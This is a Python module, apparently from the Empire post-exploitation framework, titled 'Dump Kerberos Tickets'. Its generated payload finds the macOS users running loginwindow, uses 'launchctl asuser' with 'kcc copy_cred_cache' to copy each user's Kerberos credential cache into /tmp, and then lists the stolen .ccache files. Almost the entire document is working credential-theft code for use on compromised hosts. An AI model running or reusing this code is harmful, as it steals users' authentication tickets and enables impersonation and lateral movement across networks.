from lib.common import helpers
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Dump Kerberos Tickets',
            'Author': ['@424f424f,@gentilkiwi'],
            'Description': ('This module will dump ccache kerberos'
                            'tickets to the specified directory'),
            'Background': False,
            'OutputExtension': None,
            'NeedsAdmin' : False,
            'OpsecSafe': False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': [
                'Thanks to @gentilkiwi for pointing this out!'
            ]
        }
        self.options = {
            'Agent': {
                'Description'   :   'Agent to grab a tickets from.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        script = """
import subprocess
kerbdump = \"""
ps auxwww |grep /loginwindow |grep -v "grep /loginwindow" |while read line
do
    USER=`echo "$line" | awk '{print $1}'`
    PID=`echo "$line" | awk '{print $2}'`
    USERID=`id -u "$USER"`
    launchctl asuser $USERID kcc copy_cred_cache /tmp/$USER.ccache
done
""\"
try:
    print "Executing..."
    output = subprocess.Popen(kerbdump, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read()
    print output
except Exception as e:
    print e
try:
    print "Listing available kerberos files.."
    output = subprocess.Popen('ls /tmp/*.ccache', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read()
    print output
except Exception as e:
    print e
"""
        return script